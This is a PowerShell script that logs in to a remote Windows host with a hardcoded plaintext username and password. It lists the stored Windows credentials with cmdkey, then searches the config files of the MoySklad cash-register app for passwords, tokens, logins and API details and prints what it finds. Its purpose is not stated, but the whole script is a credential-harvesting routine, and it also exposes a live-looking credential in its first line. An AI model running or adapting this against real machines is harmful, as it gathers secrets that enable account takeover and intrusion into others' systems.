$cred = New-Object PSCredential('usr1cv8', (ConvertTo-SecureString 'usr1cv8' -AsPlainText -Force))
Invoke-Command -ComputerName 26.79.213.133 -Credential $cred -ScriptBlock {
  Write-Host "=== CMDKEY ==="
  cmdkey /list 2>&1

  Write-Host "`n=== MoySklad config files ==="
  Get-ChildItem -Path "C:\Users\1\AppData\Roaming\moysklad-kassa" -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime | Format-Table -AutoSize

  Write-Host "`n=== Search for tokens/passwords in moysklad ==="
  $paths = @(
    "C:\Users\1\AppData\Roaming\moysklad-kassa",
    "C:\Program Files (x86)\moysklad-kassa"
  )
  foreach ($p in $paths) {
    if (Test-Path $p) {
      Get-ChildItem $p -Recurse -Include *.json,*.cfg,*.conf,*.ini,*.xml,*.txt,*.env -ErrorAction SilentlyContinue | ForEach-Object {
        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
        if ($content -match 'password|token|login|remap|api\.moysklad|piot|esp|marking') {
          Write-Host "--- $($_.FullName) ---"
          Write-Host $content.Substring(0, [Math]::Min(2000, $content.Length))
        }
      }
    }
  }
} 2>&1

